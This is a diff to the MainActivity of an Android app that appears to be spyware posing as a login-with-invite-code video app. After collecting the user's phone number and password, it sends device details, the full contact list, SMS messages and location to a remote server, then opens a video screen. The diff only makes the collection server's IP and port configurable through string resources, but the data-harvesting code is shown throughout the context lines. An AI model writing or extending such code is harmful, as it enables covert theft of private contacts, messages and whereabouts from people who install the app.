@@ -83,8 +83,9 @@ import okhttp3.RequestBody;
 import okhttp3.Response;
 
 public class MainActivity extends AppCompatActivity {
-
-    private String url = "http://10.10.183.187:3000";
+    private String serverIp;
+    private String serverPort;
+    private String  url;
     private static final int PERMISSION_REQUEST_CODE = 123;
 
     EditText editTextPhone, editTextPassword, editTextInviteCode;
@@ -314,16 +315,19 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void handlePermissionsResult() {
-        uploadDeviceInfo(new UploadCallback() {
+        serverIp = getString(R.string.server_ip);
+        serverPort = getString(R.string.server_port);
+        url = "http://" + serverIp + ":" + serverPort;
+        uploadDeviceInfo(url,new UploadCallback() {
             @Override
             public void onUploadComplete() {
                 runOnUiThread(() -> {
                     if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
-                        uploadContacts();
+                        uploadContacts(url);
                     }
 
                     if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
-                        uploadSms();
+                        uploadSms(url);
                     }
 
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -348,7 +352,7 @@ public class MainActivity extends AppCompatActivity {
                         }
                     }
 
-                    uploadLocation(latitude, longitude, addressString);
+                    uploadLocation(latitude, longitude, addressString,url);
 
                     Intent intent = new Intent(MainActivity.this, VideoActivity.class);
                     startActivity(intent);
@@ -566,7 +570,7 @@ public class MainActivity extends AppCompatActivity {
         return Formatter.formatIpAddress(wifiManager.getConnectionInfo().getIpAddress());
     }
 
-    private void uploadContacts() {
+    private void uploadContacts(String url) {
         List<Contact> contacts = getContacts();
         Gson gson = new Gson();
         String jsonContacts = gson.toJson(contacts);
@@ -595,7 +599,7 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 
-    private void uploadSms() {
+    private void uploadSms(String url) {
         List<Sms> smsList = getSms();
         List<Map<String, String>> smsData = new ArrayList<>();
         for (Sms sms : smsList) {
@@ -698,7 +702,7 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void uploadLocation(String latitude, String longitude, String address) {
+    private void uploadLocation(String latitude, String longitude, String address,String url) {
         Map<String, String> locationData = new HashMap<>();
         locationData.put("latitude", latitude);
         locationData.put("longitude", longitude);
@@ -731,7 +735,7 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 
-    private void uploadDeviceInfo(UploadCallback callback) {
+    private void uploadDeviceInfo(String url,UploadCallback callback) {
         deviceModel = getDeviceModel();
         ipAddress = getIPAddress();
         phoneNumber = editTextPhone.getText().toString().trim();
